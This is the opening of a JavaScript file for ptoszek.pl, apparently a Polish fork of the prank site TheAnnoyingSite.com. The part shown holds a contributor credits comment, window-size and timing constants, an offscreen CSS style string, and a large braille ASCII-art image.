/*
  ptoszek.pl
  Powered by Jaczup

  My version (ptoszek.pl): 
  - https://github.com/jaczup/ptoszek.pl
  Original version (theannoyingsite.com): 
  - https://github.com/feross/TheAnnoyingSite.com/

  Contact with me: https://jaczup.pl

  Contributors:
    @jaczup - https://github.com/jaczup
    @intexpression - https://github.com/intexpression
    @dan64iel - https://github.com/dan64iel
    @imzeme - https://github.com/imzeme
    @GameShoot8050 - https://github.com/GameShoot8050
    @wetraks -  https://github.com/wetraks
    @cryblanka - https://github.com/cryblanka
    @9fm - https://github.com/9fm
    @MARECKIyt - https://github.com/MARECKIyt
  
*/

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 15
const MARGIN = 10
const TICK_LENGTH = 50

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣤⣶⣶⣶⣶⣶⣶⣶⣦⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⣿⣿⣷⣶⣶⣤⣤⣄⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⢿⡿⠛⢋⣩⣽⠿⠿⠛⠛⢛⣛⣉⣉⣙⣛⣓⣒⠒⠠⠀⢀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣀⣀⣀⠀⠀⠀⢀⣀⠻⢿⣿⣿⣿⣿⣿⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡿⣿⡿⣿⠟⠁⣠⠞⠋⢁⣠⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣒⡂⠒⠢⠤⣤⣀⣀⣀⣀⣀⠀⣀⠀⢀⣀⣠⣤⣴⠾⠟⠛⣛⣉⣉⣩⣭⣤⣭⠉⠉⠛⠻⢿⣿⣓⠲⠤⠀⡉⠑⠻⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⢋⣼⣧⢤⠊⠀⡠⠞⠛⠋⠉⠁⢀⣀⣀⣀⣀⣀⠀⠀⠉⠙⠓⠾⢭⣝⣛⠶⣦⣄⣠⣭⠽⣛⣿⠿⣿⣛⣫⡽⢛⣭⢔⣠⠴⠾⠟⠿⠿⠶⣤⣬⣭⣝⣓⡦⢄⠂⢤⡉⠛⠶⣄⠀⠰⣄⠀⠹⣯⠽⣿⣿⣿⣮⣽⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⡿⢁⣼⣿⣴⠞⠑⠁⠀⡀⠤⠒⢋⣩⣽⣿⣿⣿⣿⣹⣻⣿⣶⣦⣄⠐⠢⢤⣍⣙⠓⠮⣍⡓⠄⣐⡾⠿⢻⣿⣥⠞⣫⡶⢟⣡⣴⣶⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣶⣄⣙⠳⣦⡀⠑⠄⠹⣷⣤⡛⠑⣄⢻⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣱⡟⣽⣿⡟⣜⠀⢀⣞⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡉⠙⠻⠿⢶⣾⣬⣅⣀⣤⣞⢋⣥⠞⠋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣿⣷⣄⠠⡘⣿⣷⠀⣘⣷⣿⣿⡿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⡿⣿⣿⣱⢃⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣖⣛⣿⠛⠾⣍⠉⢀⣔⣽⣣⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⢷⡀⢈⢿⣿⣻⢳⣽⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⡟⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣭⣿⣓⣶⣼⡏⣿⢏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣧⢢⡹⣿⣿⡆⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⡟⣱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣹⡿⢷⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⠹⣿⣇⢸⡟⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣯⣴⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣷⣿⣹⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢳⣿⣿⣾⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣲⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣶⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⢟⣯⣭⣝⣚⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣿⣿⣿⡿⠛⣡⡴⠛⣩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠗⣻⠷⣿⠀⠤⠤⢍⡛⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣉⡉⢻⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀
⠀⠀⠀⣾⣿⢫⡾⢁⣴⣟⣁⣀⣰⠷⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⠉⠁⠀⠀⠀⠀⠰⡀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠿⣿⡿⣟⡛⠿⣧⠻⣷⣮⡙⢿⣿⣇⠀⠀⠀
⠀⠀⣼⣿⣷⣫⣶⠟⣹⠟⢛⣿⡿⣾⣓⣶⣄⣈⣿⠿⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⢿⢿⣿⢃⠀⠀⠀⠀⠀⠀⢀⣿⣿⣷⢸⠷⣽⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠉⢁⣀⣈⣀⡀⠀⠙⠂⠈⢷⡘⢿⣷⡌⢿⣿⡄⠀⠀
⠀⢸⣿⣿⣿⡿⠁⣼⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⣦⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⢘⠊⠃⠁⠀⠀⠀⠀⠀⢸⣼⣟⠇⠀⠀⠀⠉⠻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠩⢴⣶⡶⣶⣟⣿⣿⣿⣿⣿⣿⣷⣤⣄⠀⠀⠻⣄⠻⣿⠈⣿⣿⡆⠀
⠀⣿⣿⣿⣿⠂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣻⡏⠀⣀⣀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡉⠀⠀⠀⠀⠀⠀⢿⡯⢿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠘⣧⠙⣧⠸⣿⣷⠀
⠀⣿⡿⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣉⠛⠿⣿⡿⢿⣿⡿⠿⣋⣩⣵⣶⡿⣇⡈⠿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⣾⣿⣿⡷⢀⡼⠳⢤⣼⣿⣋⣉⣉⣁⣤⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠘⣧⠹⣇⣿⣿⠀
⠀⣿⡇⣿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣬⣩⣭⣥⣤⣬⣭⣽⣿⣯⣤⣌⡙⠛⠛⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⠟⠁⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⢿⣿⡿⢿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠸⡇⢿⣼⣿⡀
⠠⢿⡇⡿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣼⠙⣹⠫⠿⣿⣻⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣏⠓⠦⣄⣀⣀⡤⣶⣤⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⡿⡟⣿⣿⠿⣿⣿⢿⡇⢻⡟⠈⣿⣙⣹⡇⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⢸⣿⣿⡇
⠀⣾⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣷⢿⠤⣤⡏⠁⣿⠁⣾⠁⢫⢿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⠙⠃⠹⣷⠀⢿⡏⠀⣷⣠⣷⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣾⢹⣿⠃
⠀⢀⣿⣿⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣧⣮⣜⡏⣰⣦⣿⣀⡇⠀⠃⡿⠋⠈⡼⣿⡿⢡⢳⢹⣿⣿⣿⣿⡿⠹⠉⠿⡏⣿⣿⣿⣿⣿⡿⡿⠃⠀⠈⠻⣿⣿⢿⠿⠋⠃⠈⠓⢹⡄⠀⠀⢻⠀⠸⡇⣠⣿⠿⣿⣿⣾⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⡇⣼⣿⠀
⠀⠀⠻⣿⣧⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣧⣿⣿⣷⣤⣸⠁⠀⠀⠁⣿⠁⠀⠘⢸⣿⣿⠛⠹⠀⠀⠀⠀⠀⠈⠧⢻⣿⠛⠀⠃⠀⠀⠀⠀⠛⢻⡎⠀⠀⠀⠀⠀⠸⡇⠀⠀⢸⠇⣠⣿⣿⣿⣷⠻⣮⣉⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⣇⣿⡟⠀
⠀⠀⠀⢻⣿⡆⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⣿⣿⡿⣿⣿⣿⣷⣄⠀⢀⡟⠀⠀⠁⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⣿⣿⣿⣯⣱⣆⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⡾⣸⣿⠇⠀
⠀⠀⠀⠈⠛⣿⡄⠀⠘⡟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣏⣿⣿⠿⣿⢷⣤⣧⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⣀⣀⣀⣀⣇⣠⣴⠿⢻⢱⠀⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣾⠃⣿⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢦⣀⠸⡄⠟⣇⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣰⠁⣘⡟⣿⣷⣶⣦⣤⣴⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣿⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⠻⡟⣿⢛⠛⡏⢻⣤⣼⣾⣷⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⣰⠏⠈⣼⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⣧⣽⣦⡹⣿⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣧⣣⣿⢹⣿⢋⣿⢻⢿⣿⠿⢹⠙⡏⣿⠛⡏⠟⡏⡍⡏⡏⢫⢹⠈⢹⠰⠸⠀⢹⣧⠃⣷⣼⣾⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⠟⠁⣠⡟⠀⣴⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣷⡈⠉⠛⢶⣿⣿⣿⡿⣿⣿⣿⣿⣯⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣼⣾⣿⣸⣸⡆⣷⣸⡀⡇⡆⡇⣡⣧⣇⢸⣸⢸⢸⣆⣶⣷⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠏⣠⣿⣿⣿⡿⡃⢀⣴⠟⣀⠜⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⠻⣿⡌⠶⣄⠈⠛⢯⡿⣿⣿⣿⣿⣿⣿⣿⢿⣿⢿⣿⣿⡇⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣧⣿⣿⣿⣿⣿⡟⣠⣿⣿⡿⣻⣟⣰⣿⣯⡾⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢌⣿⣶⣌⠳⣦⣀⠉⠊⠛⢿⡿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣾⣿⠋⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⠟⣿⠉⣿⣿⣿⣿⣿⡟⡇⢹⣸⣾⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣵⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⢻⢿⣶⣽⣷⣦⣀⠑⢷⣌⠙⢿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣶⣿⣿⣿⡟⡏⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡟⡿⠉⢋⠈⢀⢸⣦⣿⣿⡿⣿⡿⢀⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⣵⡿⣱⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢧⠙⢻⣿⣿⣿⢷⣄⡙⢧⣄⠈⠻⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣇⡇⣯⡁⠈⣏⡇⢿⢸⠁⢹⠉⣿⡇⣿⡏⡟⡏⡏⡏⣷⠁⠀⡇⡄⢠⣸⣿⡿⢿⢣⣿⣷⣿⣿⣿⣿⣿⣿⣿⡿⠟⢁⠞⣡⣾⣿⣿⣿⣿⢯⣾⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣦⣀⠻⣿⣿⣟⣿⣦⠙⣦⡀⠈⢿⣽⠻⣿⣿⣿⣿⣿⣯⡹⣿⢻⣿⣿⣧⣿⣇⢸⠀⠀⠸⠀⢹⠃⢸⡇⣇⡇⡇⠁⣿⢸⣀⣷⣼⣿⣿⣿⡴⢟⣵⣿⣿⣿⣿⣿⡿⠋⠉⠁⣠⡴⠋⣴⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⠻⣄⠘⣿⣿⣿⣿⣷⡈⣷⠀⠀⢻⣇⢸⡻⢿⣿⣿⣿⣿⣿⣧⣽⣟⣿⣿⣿⣿⣿⣧⣴⣶⣾⣴⣦⣿⣿⣷⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣽⠋⠀⢠⣴⠛⠁⢀⣾⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠌⡢⠈⢻⣻⣿⣞⣷⡘⣧⠀⠀⢿⣎⣧⠀⣿⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣿⠛⠛⠛⠉⡟⠛⡏⢉⣿⠃⢀⣼⠟⠋⠀⣠⡾⠟⣹⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣧⡀⠙⢟⣿⣿⣧⠹⣇⠀⠈⢿⣿⣆⢻⡀⠀⢀⣷⠀⠀⠹⡇⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠁⢸⡇⠀⠀⡯⠀⠀⠀⣸⡇⣼⢡⣾⠃⠰⠋⠀⠀⣠⡾⠋⢀⣾⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢝⢦⡀⠉⠻⣿⣇⢻⡆⠀⠈⢿⣿⣿⣇⣃⢸⣿⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⢺⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⢀⡇⠀⠀⢠⡏⣴⣿⡾⢁⠄⠀⠀⣠⣾⡏⠀⣰⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠹⣖⣆⠈⢻⣬⣿⡆⠀⠈⢿⣿⣿⣿⣾⣿⣷⠀⠀⣿⡄⠀⠀⠀⠀⠀⢠⣾⢇⠀⠀⠀⠀⠀⠀⣼⠀⠀⣸⣿⢀⢸⣿⣿⣿⡟⢀⡎⠀⣠⣾⣿⠏⢀⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣧⠈⠺⣧⠀⠙⢿⢿⡄⠀⠈⢿⣿⣿⣿⣿⣿⡆⠀⣿⣷⠀⠀⠀⠀⡆⣼⣿⡆⣦⡀⠀⠀⠀⢀⣿⡆⠀⣿⣿⣮⣿⣿⣿⠏⢠⡾⠀⢠⣿⡿⠃⣰⣿⡿⣻⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣿⣿⣇⠀⠘⡆⠀⠈⢫⣷⠀⠀⠈⢿⣿⣿⣿⣿⣷⣸⣿⣿⣞⡀⠀⡀⣧⣿⣿⣧⣻⣷⣷⣰⡁⢸⣿⣇⣾⣿⣿⣿⣿⣿⠃⢠⣿⠃⣠⣿⠟⠀⣰⡿⢋⣴⣟⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⡄⠀⠘⡄⠈⣦⢻⡇⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⠇⢀⣾⠎⣴⡿⠃⠀⢀⣾⣶⣿⣿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠄⠘⢄⠈⢷⣿⣆⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣼⢏⣼⡟⠁⠀⣰⣿⣿⢿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠰⡀⠀⠣⡈⢳⡿⣷⣄⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⡾⢃⣾⡟⠀⠀⣴⣿⡟⢡⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠣⠀⠀⠈⢄⠹⣏⠻⣷⣄⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠉⣰⡿⢡⣾⢿⠁⠀⣼⣿⠏⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⡀⠀⠀⠱⡘⢧⡈⠿⣷⠀⠀⠀⠀⠉⠙⠻⠿⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠋⠉⠁⠀⢀⡴⠏⢠⣿⣷⠃⠀⣼⣿⠏⡰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
